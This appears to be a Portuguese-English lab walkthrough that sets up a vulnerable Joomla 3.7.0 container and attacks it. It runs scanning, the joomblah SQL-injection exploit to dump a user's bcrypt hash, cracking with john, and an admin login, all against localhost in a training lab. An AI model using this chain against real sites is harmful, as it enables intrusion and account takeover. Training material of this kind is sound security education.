# Joomla 3.7.0 Vulnarable
Demosntração de deploy de ambiente vulnerável para exploração da aplicação Joomla - Totalmente didático.

Docker and docker compose install
```
apt install docker.io docker-compose -y
```
Start docker service
```
systemctl start docker
```
Download docker-compose file
```
wget https://raw.githubusercontent.com/thiagosmith/joomla-3.7.0/refs/heads/main/docker-compose.yml
```
Download and execute docker
```
docker-compose up
```
Service identify
```
netstat -nltp
```
```
nmap -sV -p8080 127.0.0.1 --script=http*
```
Technology identify
```
whatweb -v http://127.0.0.1:8080
```
JoomScan Download
```
git clone https://github.com/rezasp/joomscan.git
```
Directory access
```
cd joomscan
```
JoomScan execute
```
perl joomscan.pl
```
Scanning WebApp
```
perl joomscan.pl -u http://127.0.0.1:8080
```
Download JoomBlah
```
https://raw.githubusercontent.com/thiagosmith/joomla-3.7.0/refs/heads/main/joomblah.py
```
Execute JoomBlah
```
python2 joomblah.py
```
Target Exploiting
```
python2 joomblah.py http://127.0.0.1:8080
```
Website access

http://127.0.0.1:8080/administrator/index.php
```
Login
admin:admin

Users - - > Manager - - > Add New User
Name: Redscan Academy
Login Name: redscan
Password: spongebob
Confirm Password: spongebob
Email: redscan@redscan.local
Save
```
```
Assigned User Groups 
- Manager
- Administrator 
- Author 
- Editor 
- Publisher 
- Super Users 
```
Target Exploiting Again
```
python2 joomblah.py http://127.0.0.1:8080
```
Result
```
Found user [u'955', u'Redscan Academy', u'redscan', u'redscan@redscan.local', u'$2y$10$YVnymbWDLku0UN5NCorT1OoA8dmMCdibIwDma2u12u5WRWgje20Ru', u'', u'']
```
Hash file creating
```
nano redscan.hash
```
Exibindo o conteúdo do arquivo
```
cat redscan.hash
```
Result
```
$2y$10$YVnymbWDLku0UN5NCorT1OoA8dmMCdibIwDma2u12u5WRWgje20Ru
```
Analyzing hash type
```
hashid redscan.hash
```
Result
```
--File 'redscan.hash'--
Analyzing '$2y$10$YVnymbWDLku0UN5NCorT1OoA8dmMCdibIwDma2u12u5WRWgje20Ru'
[+] Blowfish(OpenBSD)
[+] Woltlab Burning Board 4.x
[+] bcrypt
--End of file 'redscan.hash'--
```
Cracking hash file
```
john --wordlist=/usr/share/wordlists/rockyou.txt redscan.hash
```
Result
```
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spongebob        (?)
1g 0:00:00:00 DONE (2026-04-21 17:53) 4.000g/s 576.0p/s 576.0c/s 576.0C/s 123456..sandra
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Login in Joomla using creds cracked
http://192.168.2.155:8080/administrator/index.php
redscan:spongebob

# Aviso de Isenção de Responsabilidade – Material de Red Team
Este material destina-se exclusivamente a fins educacionais, acadêmicos e de conscientização em segurança da informação. 

As técnicas, exemplos e cenários aqui descritos têm como objetivo demonstrar vulnerabilidades potenciais e auxiliar profissionais de segurança na prevenção, detecção e resposta a ameaças.

• Não é permitido utilizar este conteúdo para atividades ilegais, maliciosas ou que violem políticas corporativas, regulamentos ou legislações vigentes.

• O uso indevido das informações apresentadas pode resultar em sanções legais, disciplinares e criminais.

• Os autores e distribuidores deste material não se responsabilizam por qualquer dano, perda ou consequência decorrente da aplicação inadequada ou não autorizada 
das técnicas descritas.

• Recomenda-se que qualquer prática de red team seja realizada em ambientes controlados, autorizados e com consentimento explícito das partes envolvidas.
